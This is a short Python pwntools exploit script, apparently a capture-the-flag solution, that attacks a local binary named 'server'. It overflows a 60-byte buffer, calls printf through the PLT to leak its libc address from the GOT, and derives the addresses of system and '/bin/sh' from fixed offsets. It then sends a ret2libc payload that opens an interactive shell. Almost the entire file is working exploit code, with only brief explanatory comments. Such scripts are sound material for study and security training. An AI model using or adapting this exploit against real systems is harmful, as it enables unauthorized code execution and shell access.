from pwn import *

target = process('./server')

#need leak for printf to solve for location of system
# so we use the got and plt location of printf 
# to make it call itself to leak its location in 
# libc
got = p32(0x804a010)
plt = p32(0x80483f0)
popEDIEBP= p32(0x80488ea)
main = p32(0x080485b1)
payload = b"a" * 60 + plt + main + got

target.sendline(payload)
target.recvuntil(b"Return address: 0x080483f0")
target.recvline()
target.recvline()
leakline = target.recvline()
leak = leakline[:4]
leak_int = 0
count = 0

# save the address of printf in the right form
for i in leak:
    if  0 < count < 4:
        i <<= 8 * count
        leak_int |= i
    if count == 0:
        leak_int |= i
    count += 1

# use offsets to find locations of system, "/bin/sh"
printf_libc = int(hex(leak_int),16)
libc_start = printf_libc - 0x574f0
system_libc = libc_start + 0x47cb0
bin_libc = libc_start + 0x1b90f5

# send payload
payload = b"A" * 60 + p32(system_libc) + p32(0x0) + p32(bin_libc)
target.sendline(payload)
target.interactive()
